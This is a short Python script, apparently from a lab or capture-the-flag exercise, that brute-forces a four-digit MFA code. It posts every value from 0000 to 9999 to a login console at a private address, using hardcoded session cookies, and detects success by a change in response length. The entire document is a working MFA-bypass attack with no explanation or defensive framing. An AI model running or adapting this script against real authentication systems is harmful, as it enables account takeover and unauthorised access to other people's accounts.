#!/usr/bin/env python3

import requests

url = 'http://10.10.136.9/console/mfa.php'
cookies = {'pwd': 'muhuo', 'user': 'jason_test_account'}
code = ["%04d" % num for num in range(10000)] # A list that stores 0000 to 9999

for number in code:
	payload = {'code': number}
	r = requests.post(url, cookies=cookies, data=payload)

	incorrect_msg = str(r.headers['Content-length'])
	print('\r', end='') # Clear previous line.
	print(f'[+] Bruteforcing code: {number}', end='')

	if incorrect_msg != "919": # Incorrect code content length is 919.
		print(f'[+] Found MFA code: {number}')
		exit()